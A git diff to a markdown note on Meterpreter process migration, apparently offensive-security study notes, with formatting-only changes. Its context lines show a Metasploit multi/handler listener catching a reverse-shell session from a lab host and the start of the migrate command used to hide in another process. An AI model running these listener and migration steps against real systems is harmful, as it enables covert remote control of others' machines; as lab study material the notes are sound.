@@ -1,10 +1,10 @@
 # 03 - Process Manipulation
 
-Search Tag: #metasploit-framework #command-and-control
+Search Tag(s): #metasploit-framework #command-and-control
 
 ## 3.1 - Migrate to Another Process
 
-* **Setting up listener to auto migrate to another process**
+* Setting up listener to auto migrate to another process
 
 ```
 msf exploit(multi/handler) > set lhost 10.0.2.4
@@ -27,7 +27,7 @@ msf exploit(multi/handler) > exploit
 [*] Meterpreter session 4 opened (10.0.2.4:4444 -> 10.0.2.15:49840 ) at 2022-05-15 15:35:51 -0400
 ```
 
-* **Migrate to another process**
+* Migrate to another process
 
 ```
 meterpreter > migrate -h
